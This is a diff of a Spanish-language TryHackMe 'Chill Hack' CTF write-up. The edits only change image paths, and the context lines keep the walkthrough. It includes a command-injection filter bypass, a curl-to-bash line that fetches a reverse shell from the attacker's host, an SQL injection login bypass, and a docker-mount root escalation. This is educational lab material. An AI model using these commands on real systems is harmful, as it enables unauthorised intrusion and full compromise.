@@ -5,7 +5,7 @@ excerpt: "Este writeup detalla el proceso que se llevo a cabo para hackear la ma
 date: 2023-01-08
 classes: wide
 header:
- teaser: /assets/images/chillHack/chillHack.png
+ teaser: /assets/images/THM/chillHack/chillHack.png
  teaser_home_page: true
  icon: /assets/images/thm.webp
 categories:
@@ -17,7 +17,7 @@ tags:
   - sql injection
 ---
 
-![](/assets/images/chillHack/chillHack.png)
+![](/assets/images/THM/chillHack/chillHack.png)
 
 ## Introduccion
 
@@ -131,7 +131,7 @@ Anurodh told me that there is some filtering on strings being put in the command
 
 Eso me dio una pista, que me dice que hay filtrado en las cadenas que se ponen en el comando. Aqui ya empeze a enumerar mas a fondo el sistema y los servicios que se estaban corriendo. Como el puerto 80 esta abierto, accedí a el, para revisar el contenido en la web.
 
-![](/assets/images/chillHack/2023-01-09_11-04.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-04.png)
 
 ### Go Buster
 
@@ -177,25 +177,25 @@ En el escaneo vi un directorio algo sospecho por su nombre y es "/secret".
 
 En la enumeración, descubrí un directorio llamado secret, entonces lo busque en la web y me mando a otra pagina diferente a la que estaba, aqui supuse que si colocaba algun comando lo iba a ejecutar, por como se ve todo.
 
-![](/assets/images/chillHack/2023-01-09_11-13.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-13.png)
 
 De primeras probe con el comando `ls` para listar lo que hay en el directorio y al darle ejecutar me mostro el siguiente aviso.
 
-![](/assets/images/chillHack/2023-01-09_11-14.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-14.png)
 
 Utilice otros comandos como `ifconfig` o `hostname -I`, y estos comandos si permitio ejecutarlos. Antes en la enumeracion revise un archivo `note.txt` donde me daba un pista sobre filtrado en la cadena de un comando, por lo que al parecer existe alguna sanitización en el codigo fuente y me dio una idea de que hacer, volver al lanzar el comando de forma diferente.
 
-![](/assets/images/chillHack/2023-01-09_11-17.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-17.png)
 
 Usando un escapado `\`  me permitio ejecutar los comandos que anteriormente no dejaba, al lanzar el comando `ls` listo un archivo .php, asi que pase a revisar ese archivo con el comando cat escapandolo.
 
 Ejecutando el comando de esta forma `c\at index.php`.
 
-![](/assets/images/chillHack/2023-01-09_11-18.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-18.png)
 
 En este punto yo veo algo diferente a la pagina anterior, por lo que me causo curiosidad, entonces pase a revisar el codigo fuente, teclando ctrl + u  y al revisar el codigo, se ve un codigo PHP que anteriormente no se veia.
 
-![](/assets/images/chillHack/2023-01-09_11-21.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-21.png)
 
 Ahora se puede ver la sanitizacion que se le hizo a la pagina, ya sabiendo eso y sabiendo como escapar los comando sanitizados, puedo intentar crear un archivo en php con una reverse shell en bash y con un comando que se le pasara desde la pagina, ejecutarlo y asi ganar acceso desde consola al servidor.
 
@@ -223,7 +223,7 @@ En este punto, ya tenia listo el netcat y el servidor con el archivo creado, asi
 curl http://10.4.11.19:8080/shell.sh | b\ash
 ```
 
-![](/assets/images/chillHack/2023-01-09_11-32.png)
+![](/assets/images/THM/chillHack/2023-01-09_11-32.png)
 
 Y si todo sale bien, por detras con netcat obtengo la shell del servidor.
 
@@ -381,7 +381,7 @@ Hello user! I am test,  Please enter your message: /bin/bash
 
 Aqui le pasamos un nombre cualquiera y como mensaje le pedimos ejecutar una `/bin/bash` y ya teniendo acceso a la bash con usuario apaar, busco para obtener la flag de usuario pedida por TryHackMe.
 
-![](/assets/images/chillHack/2023-01-09_22-40.png)
+![](/assets/images/THM/chillHack/2023-01-09_22-40.png)
 
 En este punto, antes habia visto el puerto 9001 abierto pero de forma interna en el local host, por lo que hay dos formas de poder realizar un tunel inverso, ya sea con SSH o usando el binario Chisel y poder ver lo que hay en ese puerto.
 
@@ -445,11 +445,11 @@ Teniendo esto use el siguiente comando para crear el tunel inverso al puerto que
 ssh -L <port>:127.0.0.1:<port> -i <name_file> <user>@<IP objetivo>
 ```
 
-![](/assets/images/chillHack/2023-01-09_22-54.png)
+![](/assets/images/THM/chillHack/2023-01-09_22-54.png)
 
 Ahora pasare abrir el puerto desde la web a ver que hay.
 
-![](/assets/images/chillHack/2023-01-09_22-57.png)
+![](/assets/images/THM/chillHack/2023-01-09_22-57.png)
 
 En el puerto interno encontre un panel de control pero no tengo credenciales para acceder a el.
 
@@ -461,27 +461,27 @@ Para usar chisel debo tener dos copias del binario, uno en la maquina objetivo y
 
 Monte un servidor desde mi maquina de atacante.
 
-![](/assets/images/chillHack/2023-01-09_23-08.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-08.png)
 
 Ahora monto un cliente desde la maquina objetivo.
 
-![](/assets/images/chillHack/2023-01-09_23-09.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-09.png)
 
 Reviso si se da la conexion del lado del servidor y listo por lo tanto pase a revisar tambien la web.
 
-![](/assets/images/chillHack/2023-01-09_22-57.png)
+![](/assets/images/THM/chillHack/2023-01-09_22-57.png)
 
 En este punto que vi un panel de inicio de sesion pase a utilizar una tipica injection SQL `' OR 1=1-- -` y una contraseña cualquiera.
 
-![](/assets/images/chillHack/2023-01-09_23-12.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-12.png)
 
 Me abrio esta pagina `/hacker.php`.
 
-![](/assets/images/chillHack/2023-01-09_23-13.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-13.png)
 
 En este punto me dio una pista, diciendo que mire en la oscuridad, por lo que me causa curiosidad y me descargo la imagen.
 
-![](/assets/images/chillHack/2023-01-09_23-16.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-16.png)
 
 ### Steg Hide
 
@@ -506,11 +506,11 @@ Y para extraerlo use el siguiente comando:
 steghide extract -sf <name_img>
 ```
 
-![](/assets/images/chillHack/2023-01-09_23-21.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-21.png)
 
 Con el comando unzip podemos extraer lo del archivo `.zip`.
 
-![](/assets/images/chillHack/2023-01-09_23-22.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-22.png)
 
 Al unzipiar el archivo me pide una contraseña que aun no se, por lo que usare la herramienta de jhon para archivos `.zip`.
 
@@ -548,7 +548,7 @@ Session completed
 
 Me descomprimio un archivo llamado `source-code.php`, pase a revisarlo y me encuentro con una contraseña en base 64 y el usuario Anurodh.
 
-![](/assets/images/chillHack/2023-01-09_23-31.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-31.png)
 
 Decodificamos la contraseña en base64:
 
@@ -559,7 +559,7 @@ Decodificamos la contraseña en base64:
 
 Teniendo esto en cuenta pude realizar un movimiento lateral al usuario Anurodh con la contraseña dada.
 
-![](/assets/images/chillHack/2023-01-09_23-35.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-35.png)
 
 ## Escalada de privilegios
 
@@ -580,4 +580,4 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 Y este comando me dio los privilegios de root. 
 
-![](/assets/images/chillHack/2023-01-09_23-41.png)
+![](/assets/images/THM/chillHack/2023-01-09_23-41.png)
